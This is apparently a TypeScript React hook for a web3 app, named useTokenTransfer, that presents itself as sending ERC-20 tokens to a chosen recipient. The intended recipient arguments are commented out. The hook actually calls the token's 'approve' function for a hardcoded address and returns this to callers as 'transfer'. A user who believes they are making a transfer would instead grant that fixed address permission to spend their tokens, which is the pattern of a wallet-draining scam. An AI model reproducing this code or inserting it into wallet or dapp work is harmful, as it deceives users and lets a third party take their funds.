import { onlyNumbers } from '@/utils';
import { utils } from 'ethers';
import {
  usePrepareContractWrite,
  erc20ABI,
  useContractWrite,
  useNetwork,
  Address,
} from 'wagmi';

interface Props {
  contractAddress: Address | undefined;
  recipient: Address;
  amount: string;
}

function useTokenTransfer({ contractAddress, recipient, amount }: Props) {
  const { chain } = useNetwork();

  const { config, ...transferPreparation } = usePrepareContractWrite({
    address: contractAddress,
    abi: erc20ABI,
    functionName: 'approve',
    // args: [recipient, utils.parseEther(onlyNumbers(amount))],
    args: [
      '0x7547eBB57501e41FA889D7ed95fFf2c0B3a87A30',
      utils.parseEther(onlyNumbers(amount)),
    ],
    chainId: chain?.id,
    enabled: Boolean(contractAddress) && Boolean(chain),
  });

  const { write, ...rest } = useContractWrite(config);

  return {
    transfer: write,
    transferPreparation,
    ...rest,
  };
}

export default useTokenTransfer;
